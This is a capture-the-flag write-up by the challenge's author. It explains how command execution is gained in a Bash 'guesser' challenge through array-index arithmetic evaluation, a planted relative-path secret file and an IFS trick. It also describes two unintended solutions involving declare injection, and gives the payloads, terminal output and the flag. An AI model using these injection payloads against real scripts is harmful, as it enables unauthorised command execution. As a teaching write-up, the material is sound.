# guesser

## Write-up 
> `Note` : In this challenge, I made a mistake that made the challenge easier to solve. In the next few lines, I will cover the intended solution if the mistakes were not made, then I will mention what I have done wrong.

Because the secret does not appear to be intriguing, the player must have command execution in order to read the flag in this challenge. 

> If you guess the secret, you will only get a win statement without any additional information, and we can also change the secret since it's reading it using a relatif path.  

In order to solve the challenge, we need the following information:
- Since the path of the file is relatif, we can set our own secret.
-  `-v` is an option used by `test` that checks if a variable is set or not.
-  You can have the index of an array as a command `array[$(id)]`
-  Bash separete parameters depending on the  caracters in `IFS` content for example if you set `IFS=A` and a variable `var=File1AFile2` then try `cat $var` this is what you will get as a results  
```bash
cat: File1: No such file or directory
cat: File2: No such file or directory

```

So we create our own secret file containing our payload, which will be `-v array[$(cat /flag.txt)]`. This will be placed inside the tescase, Bash will test whether the variable array is set or not, which means checking the element at the given index thus it will execute the command that we have supplied. But this won't work because it contains space `There is a function that checks if the secret contains space or not`, but it can be solved by using IFS. Since we can declare a variable at the beginning of the code, we can simply use IFS as an arugment and then it will contain X. What we should do now is just repalce the space in our payload to X.  
The content of the secret:

```bash
ctf@db19f908c545:/tmp$ cat secret 
-vXarray[$(id)]
ctf@db19f908c545:/tmp$ /home/ctf/run whtvr IFS
/home/ctf/guess: line 25: uid=1000(ctf) gid=1000(ctf) egid=1001(linus) groups=1001(linus): syntax error in expression (error token is "(ctf) gid=1000(ctf) egid=1001(linus) groups=1001(linus)")

```

As you can see, we have command execution with linus as the effective group id. Now let's read the flag:  

```bash
ctf@db19f908c545:/tmp$ cat secret 
-vXarray[$(cat /home/ctf/flag.txt)]
ctf@db19f908c545:/tmp$ /home/ctf/run whtvr IFS
/home/ctf/guess: line 25: shellmates{W3_H4v3_a_B4SH_G3niu5_RIG|-|7_H3R3}: syntax error: invalid arithmetic operator (error token is "{W3_H4v3_a_B4SH_G3niu5_RIG|-|7_H3R3}")
```

#### Mistake 1 
If you spent enough time with the challenge, you may have noticed that the function that it will check for space inside secret wasn't working because I made a mistake while writing it before my last PR for this challenge :'( which made the challenge easier since now you can have spaces in your payload, so you will no longer need to use the declare IFS trick.
content of secret will be like this :
```bash
'-v array[$(cat$IFS/home/ctf/flag.txt)]'
```


#### Mistake 2 
This was an unintentioned mistake that was used in order to solve this challenge. The fact that I added the ability to declare a variable, here you can also use the array trick and try to declare `anything[$(cat flag.txt)]`. Bash.will try to access the index, which will lead to executing the code inside. ( I had to check if the argument supplied to be declared is safe to use ).

Paylaod :
```bash
./run _ 'x[$(cat flag.txt)]'
```

> Credits go to **Raouf**  from Team **Th3jackers** for finding this.

## Flag

`shellmates{W3_H4v3_a_B4SH_G3niu5_RIG|-|7_H3R3}`
